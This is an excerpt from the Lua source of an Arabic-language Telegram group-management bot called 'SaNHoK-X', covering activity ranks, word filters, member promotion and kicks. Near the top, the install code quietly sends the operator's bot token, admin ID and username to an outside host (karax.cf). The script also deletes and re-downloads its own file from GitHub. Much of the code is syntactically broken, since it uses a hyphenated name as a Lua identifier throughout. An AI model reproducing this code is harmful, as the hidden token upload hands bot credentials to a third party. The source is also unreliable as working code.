...
https.request('http://karax.cf/SaNHoK-X/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("SaNHoK-X", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/SaNHoK-X
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./SaNHoK-X.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S SaNHoK-X -X kill
screen -S SaNHoK-X ./SaNHoK-X
done
]])  
file:close() 
...
local SaNHoK-X_Msg = ''  
if msgs < 100 then 
SaNHoK-X_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
SaNHoK-X_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
SaNHoK-X_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
SaNHoK-X_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
SaNHoK-X_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
SaNHoK-X_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
SaNHoK-X_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
SaNHoK-X_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
SaNHoK-X_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
SaNHoK-X_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
SaNHoK-X_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
SaNHoK-X_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
SaNHoK-X_Msg = 'رب التفاعل '  
end 
return SaNHoK-X_Msg 
end
...
function plugin_SaNHoK-Xa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.SaNHoK-Xa and msg then
pre_msg = plugin.SaNHoK-Xa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSaNHoK-X(msg,data) -- بداية العمل
if msg then
...
if start then 
SourceSaNHoK-Xr = start
else
SourceSaNHoK-Xr = ' ゠ههلو حياتي 🌝⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceSaNHoK-Xr) 
end
end
...
send(msg.chat_id_, msg.id_,SaNHoK-X_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf SaNHoK-X.lua')
os.execute('wget https://raw.githubusercontent.com/HECTOR-TEMA/SaNHoK-X/master/SaNHoK-X.lua')
...
usertext = '\n܁༯┆ههلو حياتي 💌 ܰ ['..result.title_..'](t.me/'..(username or 'SaNHoK-X')..')'
...
usertext = '\n܁༯┆ههلو حياتي 💌 ܰ ['..data.first_name_..'](t.me/'..(data.username_ or 'SaNHoK-X')..')'
status  = '\n☑️┆ تم ترقيته مطور في البوت'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n📤┆ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SaNHoK-X')..')'
status  = '\n☑️┆ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┆العضو » '..userid..''
...
local SaNHoK-X1_Msg = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..text..msg.chat_id_)   
if SaNHoK-X1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┆ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SaNHoK-X')..') \n 📬┆'..SaNHoK-X1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if SaNHoK-X_Msg and not Special(msg) then  
local SaNHoK-X_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if SaNHoK-X_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SaNHoK-X')..') \n☑️┆ تـم قفـل السيلفي بالتقييد\n⛔┆ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "SaNHoK-X")
...
usertext = '\n👤┆ المستخدم » ['..result.title_..'](t.me/'..(username or 'SaNHoK-X')..')'
...
usertext = '\n👤┆ العضو » ['..result.title_..'](t.me/'..(username or 'SaNHoK-X')..')'
status  = '\n☑️┆ تم الغاء حظره من هنا'
texts = usertext..status
else
...
database:set(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 🌝 ܰ")  
database:set(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."SaNHoK-X1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."SaNHoK-X1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 🌝 ܰ")  
database:del(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."SaNHoK-X1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."SaNHoK-X1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 🌝 ܰ ")  
database:set(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."SaNHoK-X1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."SaNHoK-X1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."SaNHoK-X1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."SaNHoK-X1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓🌝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local SaNHoK-X_Msg = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..SaNHoK-X_Msg.."◜\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n܁༯┆ههلو حياتي 💌 ܰ ['..result.title_..'](t.me/'..(text1[3] or 'SaNHoK-X')..')'..'\n☑️┆ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..SaNHoK-X_Msg[math.random(#SaNHoK-X_Msg)]..']') 
return false
end
...
},function(ta,SaNHoK-X)
local t = "\n٭ 𖤓 ┆ههلاو يحلوين 💌◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n" 
x = 0
local list = SaNHoK-X.members_
for k, v in pairs(list) do
x = x + 1
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سانهوك').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_, msg.id_,'📌┆ عدد المجموعات الان » { '..#group..' }'..SaNHoK-Xk..''..SaNHoK-X..'\n*☑️┆ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
SaNHoK-X = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(SaNHoK-X)
...
--------------------------------------------------------------------------------------------------------------
SourceSaNHoK-X(data.message_,data)
plugin_SaNHoK-Xa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local SaNHoK-Xbot = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..text..result.chat_id_)   
if SaNHoK-Xbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┆["..SaNHoK-Xbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local SaNHoK-X1_Msg = database:get(bot_id.."SaNHoK-X1:Add:Filter:Rp2"..text..result.chat_id_)   
if SaNHoK-X1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┆"..SaNHoK-X1_Msg)
